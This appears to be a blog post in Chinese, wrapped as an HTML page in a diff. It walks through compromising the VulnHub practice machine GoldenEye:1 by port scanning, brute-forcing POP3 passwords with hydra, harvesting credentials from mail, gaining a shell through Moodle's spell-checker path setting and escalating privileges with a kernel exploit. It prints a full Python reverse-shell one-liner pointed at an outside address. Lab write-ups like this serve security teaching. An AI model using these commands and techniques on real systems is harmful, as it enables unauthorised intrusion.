@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.sosonp.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="目标靶机GOLDENEYE:1 涉及漏洞 POP3 弱口令 web命令执行 内核漏洞  信息收集获取目标机器ip 端口扫描25、80、55006、55007端口开放，有smtp、http、pop3应用 Nikto scan发现一个splashAdmin.php页面 dirbuster扫描路径没发现 访问80端口页面，提示到&#x2F;sev-home&#x2F;页面登陆 访问弹出一个登陆验证框，尝试一些常用弱口令无法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-GOLDENEYE:1 walkthrough">
+<meta property="og:url" content="http://blog.sosonp.com/2020/01/07/vulnhub-GoldenEye/index.html">
+<meta property="og:site_name" content="sosonp&#39;s blog">
+<meta property="og:description" content="目标靶机GOLDENEYE:1 涉及漏洞 POP3 弱口令 web命令执行 内核漏洞  信息收集获取目标机器ip 端口扫描25、80、55006、55007端口开放，有smtp、http、pop3应用 Nikto scan发现一个splashAdmin.php页面 dirbuster扫描路径没发现 访问80端口页面，提示到&#x2F;sev-home&#x2F;页面登陆 访问弹出一个登陆验证框，尝试一些常用弱口令无法">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/Ofi1zPGZdxyU294.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/RoWFwla5fZSNzU7.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/ZG1PyS2c79Ouajq.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/vJom3WXHNV2PhZQ.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/MWsZJhYFI7A8Tu1.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/wCJMualAjnYZr61.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/gKMzqkN7u1X6s34.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/R2PNnOTEFwVbIYq.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/ne1zjXsVCU395GS.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/7IvuAKOzsyoXVUG.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/YH4XmvE7IkVKlr8.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/o1GOxBpLY8EmewV.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/FGQlNq2kVXR3eYK.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/JBEMCQ62fvPxqiA.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/bg3CVuw2hKQD6Wd.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/XVzrxEJg9lwe8Ps.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/ZL8WaBMOVhPFtu5.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/H3lsihZUWjfJRmM.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/E1ZSTwmvgC8JIMB.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/9JWCFVsvpeTHODi.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/3coeIPXtvAOiVQ4.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/3aRUlWHufk7zDQP.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/UYmgxoMlfpwtCR1.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/FZoSGtr6IA3ljBn.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/CQmV1zDNATbJrqe.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/9FbQ1iPTIHVrzdD.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/yRhfZDJ8SGzOLVH.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/ywfx1rZVo2SF8ls.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/LgPBuTdDWhYI23F.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/uWbl8eGVZUchqY9.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/9TwMQHokSt4xGlA.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/24ZaKQi53qXIyUc.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/xrNmKVcwWfSAku7.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/lynFvYHwCh6iKXa.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/78DzgQvHElrYqo3.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/4jdSgDmlFMvEk9K.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/mRFtjVI5osEcGga.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/G4Mj57t6LoVzCZd.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/C6VNpQn12u7jGqX.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/N1WnfGDmPFwpZvH.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/CaMhPUxgwBKcWE6.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/FBVmQeiP9WnqkhD.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/29lnr8IWoOQPGRj.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/qsFQpBLTGnwuxAX.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/NtLuwsqmonTSRcr.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/XZpbkyTNK75R1Lm.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/PKsRUhTmx3HiM28.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/19/P72D4rWKanivlNk.png">
+<meta property="article:published_time" content="2020-01-07T12:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-20T15:20:13.353Z">
+<meta property="article:author" content="sosonp">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/09/19/Ofi1zPGZdxyU294.png">
+
+<link rel="canonical" href="http://blog.sosonp.com/2020/01/07/vulnhub-GoldenEye/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>vulnhub-GOLDENEYE:1 walkthrough | sosonp's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">sosonp's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">focus on cybersecurity</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://blog.sosonp.com/2020/01/07/vulnhub-GoldenEye/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sosonp">
+      <meta itemprop="description" content="cybersecurity">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sosonp's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub-GOLDENEYE:1 walkthrough
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-01-07 20:00:00" itemprop="dateCreated datePublished" datetime="2020-01-07T20:00:00+08:00">2020-01-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目标靶机"><a href="#目标靶机" class="headerlink" title="目标靶机"></a>目标靶机</h2><p><a href="https://www.vulnhub.com/entry/goldeneye-1,240/" target="_blank" rel="noopener">GOLDENEYE:1</a></p>
+<h2 id="涉及漏洞"><a href="#涉及漏洞" class="headerlink" title="涉及漏洞"></a>涉及漏洞</h2><ul>
+<li>POP3 弱口令</li>
+<li>web命令执行</li>
+<li>内核漏洞</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>获取目标机器ip<br><img src="https://i.loli.net/2020/09/19/Ofi1zPGZdxyU294.png" alt="1.png"></p>
+<p>端口扫描<br>25、80、55006、55007端口开放，有smtp、http、pop3应用<br><img src="https://i.loli.net/2020/09/19/RoWFwla5fZSNzU7.png" alt="2.png"><br><img src="https://i.loli.net/2020/09/19/ZG1PyS2c79Ouajq.png" alt="3.png"></p>
+<p>Nikto scan<br>发现一个splashAdmin.php页面<br><img src="https://i.loli.net/2020/09/19/vJom3WXHNV2PhZQ.png" alt="4.png"></p>
+<p>dirbuster扫描路径没发现<br><img src="https://i.loli.net/2020/09/19/MWsZJhYFI7A8Tu1.png" alt="5.png"></p>
+<p>访问80端口页面，提示到/sev-home/页面登陆<br><img src="https://i.loli.net/2020/09/19/wCJMualAjnYZr61.png" alt="6.png"></p>
+<p>访问弹出一个登陆验证框，尝试一些常用弱口令无法登陆<br><img src="https://i.loli.net/2020/09/19/gKMzqkN7u1X6s34.png" alt="7.png"></p>
+<p>访问/splashAdmin.php页面如下<br><img src="https://i.loli.net/2020/09/19/R2PNnOTEFwVbIYq.png" alt="8.png"></p>
+<p>由nikto扫描信息可知这是个Cobalt Qube 3应用，查找相关漏洞<br><img src="https://i.loli.net/2020/09/19/ne1zjXsVCU395GS.png" alt="9.png"><br><img src="https://i.loli.net/2020/09/19/7IvuAKOzsyoXVUG.png" alt="10.png"></p>
+<p>按照漏洞利用方式尝试之后没有创建admin用户，暂时放弃这条路。</p>
+<p>回到主页，查看页面源码，发现一个terminal.js<br><img src="https://i.loli.net/2020/09/19/YH4XmvE7IkVKlr8.png" alt="11.png"></p>
+<p>查看terminal.js代码，发现提示<br><img src="https://i.loli.net/2020/09/19/o1GOxBpLY8EmewV.png" alt="12.png"></p>
+<p>根据提示，用户名可能是Boris，密码应该是那段html编码的字符，解码后得到InvincibleHack3r<br><img src="https://i.loli.net/2020/09/19/FGQlNq2kVXR3eYK.png" alt="13.png"></p>
+<p>回到登陆页面，利用用户名Boris和密码InvincibleHack3r登陆失败，用户名换成小写boris登陆成功<br><img src="https://i.loli.net/2020/09/19/JBEMCQ62fvPxqiA.png" alt="14.png"></p>
+<p>页面提示让发邮件获取管理员手册，邮件服务使用非标准的高端口pop3协议运行，根据扫描信息，55007端口是pop3应用</p>
+<p>使用刚才的web用户名密码登陆失败<br><img src="https://i.loli.net/2020/09/19/bg3CVuw2hKQD6Wd.png" alt="15.png"></p>
+<p>指定用户名，使用hydra爆破pop3密码，字典使用kali自带的fasttrack，爆破出密码是secret1!<br><img src="https://i.loli.net/2020/09/19/XVzrxEJg9lwe8Ps.png" alt="16.png"></p>
+<p>使用telnet连接pop3查看邮件<br><img src="https://i.loli.net/2020/09/19/ZL8WaBMOVhPFtu5.png" alt="17.png"><br><img src="https://i.loli.net/2020/09/19/H3lsihZUWjfJRmM.png" alt="18.png"></p>
+<p>看了3封boris的邮件并没发现太多有用的信息，但提到了natalya和xenia两个用户名</p>
+<p>继续尝试对natalya爆破，得到密码是bird<br><img src="https://i.loli.net/2020/09/19/E1ZSTwmvgC8JIMB.png" alt="19.png"></p>
+<p>登陆natalya的邮箱，查看邮件<br><img src="https://i.loli.net/2020/09/19/9JWCFVsvpeTHODi.png" alt="20.png"></p>
+<p>第二封邮件发现有价值的信息<br><img src="https://i.loli.net/2020/09/19/3coeIPXtvAOiVQ4.png" alt="21.png"></p>
+<p>得到用户名/密码：﻿xenia/﻿RCP90rulez!</p>
+<p>按照邮件提示配置host：﻿severnaya-station.com<br><img src="https://i.loli.net/2020/09/19/3aRUlWHufk7zDQP.png" alt="22.png"></p>
+<p>浏览器访问﻿severnaya-station.com/gnocertdir<br><img src="https://i.loli.net/2020/09/19/UYmgxoMlfpwtCR1.png" alt="23.png"></p>
+<p>使用用户名/密码：﻿xenia/﻿RCP90rulez!登陆<br><img src="https://i.loli.net/2020/09/19/FZoSGtr6IA3ljBn.png" alt="24.png"></p>
+<p>登陆后是一个类似于博客的系统，浏览了一遍没发现文件上传、命令执行等漏洞</p>
+<p>在一个页面发现另外一个邮箱用户名: doak<br><img src="https://i.loli.net/2020/09/19/CQmV1zDNATbJrqe.png" alt="25.png"></p>
+<p>用刚才的方式破解，得到密码goat<br><img src="https://i.loli.net/2020/09/19/9FbQ1iPTIHVrzdD.png" alt="26.png"></p>
+<p>登陆邮箱查看<br>得到web系统的登陆用户名密码：﻿dr_doak/﻿4England!<br><img src="https://i.loli.net/2020/09/19/yRhfZDJ8SGzOLVH.png" alt="27.png"></p>
+<p>用用户名密码：﻿dr_doak/﻿4England!登陆web系统</p>
+<p>浏览到My private files页面发现一个文件<br><img src="https://i.loli.net/2020/09/19/ywfx1rZVo2SF8ls.png" alt="28.png"></p>
+<p>下载查看如下<br><img src="https://i.loli.net/2020/09/19/LgPBuTdDWhYI23F.png" alt="29.png"></p>
+<p>访问 ﻿<a href="http://severnaya-station.com/dir007key/for-007.jpg" target="_blank" rel="noopener">http://severnaya-station.com/dir007key/for-007.jpg</a><br><img src="https://i.loli.net/2020/09/19/uWbl8eGVZUchqY9.png" alt="30.png"></p>
+<p>下载图片，用file命令查看信息，发现一串base64：﻿eFdpbnRlcjE5OTV4IQ==<br><img src="https://i.loli.net/2020/09/19/9TwMQHokSt4xGlA.png" alt="31.png"></p>
+<p>解密得到明文：xWinter1995x!<br><img src="https://i.loli.net/2020/09/19/24ZaKQi53qXIyUc.png" alt="32.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="getshell（方法1）"><a href="#getshell（方法1）" class="headerlink" title="getshell（方法1）"></a>getshell（方法1）</h3><p>结合上面的信息，猜测是admin的密码，使用admin/xWinter1995x! 登陆web系统</p>
+<p>浏览配置项，发现一处aspell的路径配置，根据说明，aspell是输入框拼写检查的工具，这里写入一段反弹shell命令<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.25.158.138&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<p><img src="https://i.loli.net/2020/09/19/xrNmKVcwWfSAku7.png" alt="33.png"></p>
+<p>进入到新建博客页面，点击拼写检查按钮触发，但没拿到反弹shell，后续尝试了bash和nc的命令也不行。<br><img src="https://i.loli.net/2020/09/19/lynFvYHwCh6iKXa.png" alt="34.png"></p>
+<p>配置页面搜索spell配置，发现一处有spell解析器配置，默认是google的引擎，把这里改成PSpellShell，再次点击拼写检查按钮，这次获取反弹shell成功<br><img src="https://i.loli.net/2020/09/19/78DzgQvHElrYqo3.png" alt="35.png"></p>
+<p>用户是www-data<br><img src="https://i.loli.net/2020/09/19/4jdSgDmlFMvEk9K.png" alt="36.png"></p>
+<h3 id="getshell（方法2）"><a href="#getshell（方法2）" class="headerlink" title="getshell（方法2）"></a>getshell（方法2）</h3><p><img src="https://i.loli.net/2020/09/19/mRFtjVI5osEcGga.png" alt="37.png"><br>Server - enviroment页面有系统信息，叫moodle，版本是2.2.3<br>google发现metasploit有漏洞利用模块<br><img src="https://i.loli.net/2020/09/19/G4Mj57t6LoVzCZd.png" alt="38.png"></p>
+<p>打开metasploit，搜索利用模块<br><img src="https://i.loli.net/2020/09/19/C6VNpQn12u7jGqX.png" alt="39.png"></p>
+<p>设置参数<br><img src="https://i.loli.net/2020/09/19/N1WnfGDmPFwpZvH.png" alt="40.png"></p>
+<p>getshell成功<br><img src="https://i.loli.net/2020/09/19/CaMhPUxgwBKcWE6.png" alt="41.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>系统内核版本是﻿ubuntu 3.13.0-32-generic，且没有gcc<br><img src="https://i.loli.net/2020/09/19/FBVmQeiP9WnqkhD.png" alt="42.png"></p>
+<p>找到这个提权代码符合版本<br><img src="https://i.loli.net/2020/09/19/29lnr8IWoOQPGRj.png" alt="43.png"></p>
+<p>在本地ubuntu机器编译好传过去运行，报错<br><img src="https://i.loli.net/2020/09/19/qsFQpBLTGnwuxAX.png" alt="44.png"></p>
+<p>根据报错，程序调用了gcc命令，机器上有cc但没有gcc，于是把代码调用了gcc命令的那行替换成cc<br><img src="https://i.loli.net/2020/09/19/NtLuwsqmonTSRcr.png" alt="45.png"></p>
+<p>重新上传到目标机器编译运行<br><img src="https://i.loli.net/2020/09/19/XZpbkyTNK75R1Lm.png" alt="46.png"></p>
+<p>提权成功，读取flag文件<br><img src="https://i.loli.net/2020/09/19/PKsRUhTmx3HiM28.png" alt="47.png"></p>
+<p>访问/006-final/xvf7-flag/ 页面如下<br><img src="https://i.loli.net/2020/09/19/P72D4rWKanivlNk.png" alt="48.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/31/vulnhub-Fristileaks/" rel="prev" title="vulnhub-Fristileaks 1.3 walkthrough">
+      <i class="fa fa-chevron-left"></i> vulnhub-Fristileaks 1.3 walkthrough
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/14/vulnhub-lampiao/" rel="next" title="vulnhub-Lampião:1 walkthrough">
+      vulnhub-Lampião:1 walkthrough <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#目标靶机"><span class="nav-number">1.</span> <span class="nav-text">目标靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#涉及漏洞"><span class="nav-number">2.</span> <span class="nav-text">涉及漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell（方法1）"><span class="nav-number">4.1.</span> <span class="nav-text">getshell（方法1）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell（方法2）"><span class="nav-number">4.2.</span> <span class="nav-text">getshell（方法2）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">4.3.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sosonp</p>
+  <div class="site-description" itemprop="description">cybersecurity</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:root@sosonp.com" title="E-Mail → mailto:root@sosonp.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sosonp</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
